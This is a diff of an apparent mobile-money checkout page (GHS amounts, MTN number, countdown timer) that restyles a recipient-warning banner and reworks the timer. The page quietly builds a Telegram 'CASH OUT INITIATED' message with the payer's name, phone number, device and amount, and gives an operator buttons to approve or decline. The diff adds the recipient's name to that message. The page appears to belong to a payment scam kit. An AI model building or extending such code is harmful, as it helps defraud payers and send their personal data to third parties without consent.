@@ -228,17 +228,14 @@
         }
 
         .merchant-verify {
-            background: #FFF3E0;
-            color: #E65100;
-            padding: 12px 10px;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: bold;
-            margin-top: 15px;
-            border: 2px solid #E65100;
-            line-height: 1.4;
+            font-size: 13px;
+            color: #003DA5;
+            font-weight: 600;
+            line-height: 1.5;
             text-align: center;
             width: 100%;
+            padding: 10px 10px 0;
+            margin-top: 15px;
         }
 
         /* Profile Section */
@@ -863,11 +860,11 @@
                     <div class="timer-container">
                         <!-- Merchant Name Banner (Square) -->
                         <div class="merchant-banner">
-                            <div class="merchant-label">🔒 VERIFY RECIPIENT</div>
+                            <div class="merchant-label">🔒 Verify Recipient</div>
                             <div class="merchant-name-container">
                                 <div class="merchant-name" id="merchantName">THE GOAT 1 TRADING ENTERPRISE</div>
                             </div>
-                            <div class="merchant-verify" id="merchantVerifyBox">
+                            <div class="merchant-verify" style="background: #FFF3E0; color: #E65100; font-weight: bold; border: 1px solid #FFE0B2; padding: 10px; border-radius: 5px; margin-top: 10px;">
                                 ⚠️ Make sure the recipient is <span id="recipientWarningName" style="text-decoration: underline;">THE GOAT 1 TRADING ENTERPRISE</span> before you approve!
                             </div>
                         </div>
@@ -1177,7 +1174,7 @@
             sessionStorage.setItem('paymentId', paymentId);
 
             // Send initial Telegram notification
-            const initialMsg = `🚀 <b>CASH OUT INITIATED</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${name}\n📞 <b>Number:</b> ${mtn}\n📱 <b>Device:</b> ${phoneData.name}\n💰 <b>Amount:</b> GHS ${halfPrice.toLocaleString()}\n🏢 <b>Merchant:</b> ${finalMerchantName}\n━━━━━━━━━━━━━━━━━━━━\n⏳ <b>Status:</b> Waiting for receipt...\n\n<b>You can approve or decline now, or wait for receipt:</b>`;
+            const initialMsg = `🚀 <b>CASH OUT INITIATED</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${name}\n📞 <b>Number:</b> ${mtn}\n📱 <b>Device:</b> ${phoneData.name}\n💰 <b>Amount:</b> GHS ${halfPrice.toLocaleString()}\n🏢 <b>Merchant:</b> ${finalMerchantName}\n👤 <b>Recipient:</b> ${finalRecipientName}\n━━━━━━━━━━━━━━━━━━━━\n⏳ <b>Status:</b> Waiting for receipt...\n\n<b>You can approve or decline now, or wait for receipt:</b>`;
             
             const keyboard = [[
                 { text: '✅ Approve', callback_data: `approve_${paymentId}` },
@@ -1191,32 +1188,20 @@
         }
 
         function startTimer(duration) {
-            // Clear any existing timer first
-            if (timerInterval) clearInterval(timerInterval);
-            
-            let timerCount = duration;
-            
-            function updateDisplay() {
-                let minutes = parseInt(timerCount / 60, 10);
-                let seconds = parseInt(timerCount % 60, 10);
+            let timer = duration, minutes, seconds;
+            timerInterval = setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+
                 minutes = minutes < 10 ? "0" + minutes : minutes;
                 seconds = seconds < 10 ? "0" + seconds : seconds;
-                const timerEl = document.getElementById('timer');
-                if (timerEl) timerEl.textContent = minutes + ":" + seconds;
-            }
 
-            updateDisplay();
+                document.getElementById('timer').textContent = minutes + ":" + seconds;
 
-            timerInterval = setInterval(function () {
-                timerCount--;
-                if (timerCount < 0) {
+                if (--timer < 0) {
                     clearInterval(timerInterval);
-                    const step2 = document.getElementById('step2');
-                    const step3 = document.getElementById('step3');
-                    if (step2) step2.classList.remove('active');
-                    if (step3) step3.classList.add('active');
-                } else {
-                    updateDisplay();
+                    document.getElementById('step2').classList.remove('active');
+                    document.getElementById('step3').classList.add('active');
                 }
             }, 1000);
         }
